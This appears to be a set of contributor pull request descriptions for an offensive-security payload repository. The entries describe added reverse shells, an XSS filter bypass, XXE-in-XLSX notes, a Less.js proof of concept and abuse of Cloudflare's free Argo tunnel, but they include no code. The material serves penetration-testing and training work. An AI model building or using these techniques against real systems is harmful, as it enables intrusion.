body_text: Made the command to use python3 because mostly now the machines have python3 installed.
SpiderLabs' version of Responder is deprecated (per its README) so I updated link to the lgandx version. Also I added InveighZero which is a great Windows alternative for Responder.

Same method like ngrok but with CloudFlare servers,
Abuse the unauthenticated free try of CloudFlare Argo tunnel

Hi,
since a large part of the infosec community is exchanging news on twitter, i thought that the most important accounts should not be missing in this repo. I know that the list is far from complete but at least it is a start.
Feel free to add accounts as well.
Added new Bash TCP reverse shell
Added Lessjs example PoC and reference link to advisory blog post
I have added some extra information of API keys in the line 3 of README.md.
Tried to fix web.config first. But simply replace it is much better
Delete unused imports in cheatsheet reverse shell.
Slight QOL improvements for the recent changes of the chapter XXE inside XLSX file

Added Bypass dot filter. Hopefully, this will help you bypass web protection.
ref: https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code
Using exit at the end will bypass the necessity of User-agent real data existence, and it worked for several HTB challenges
Merge the notes with the existing one
